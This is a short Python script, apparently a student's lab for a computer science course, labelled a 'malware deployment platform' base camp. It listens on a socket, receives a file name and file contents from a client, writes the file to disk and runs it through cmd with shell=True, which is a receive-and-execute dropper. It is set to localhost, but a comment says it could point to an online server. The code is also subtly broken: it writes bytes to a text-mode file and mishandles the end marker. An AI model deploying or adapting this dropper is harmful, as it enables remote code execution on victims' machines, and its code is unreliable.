# BaseCamp in the infected computer
# Caleb Millard
# Lab 6 CMPT 360
# Title: malware deployment platform
# Dr. Rick Sutcliffe
# Program 2/2
import socket
import os
import subprocess


# using local IP since we will not be actually infecting anyones computers
IP = "127.0.0.1"
# this could also be changed to an online server with no connections to your PC


H = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "127.0.0.1"
print(ip)
H.bind((ip, 9898))


H.listen()
client, address = H.accept()


file_name = client.recv(1024).decode()
print(file_name)
fileSize = client.recv(1024).decode()
print(fileSize)
file = open(file_name, "w")
fileBytes = b""


done = False


while not done:
    data = client.recv(1024)
    if fileBytes[-5:] == b"<END>":
        done = True
    else:
        fileBytes += data


file.write(fileBytes)
file.close()


path = os.path.abspath(file_name)


cpp_cmd = ["cmd", "/c", file_name]
subprocess.run(cpp_cmd, check=True, shell=True)
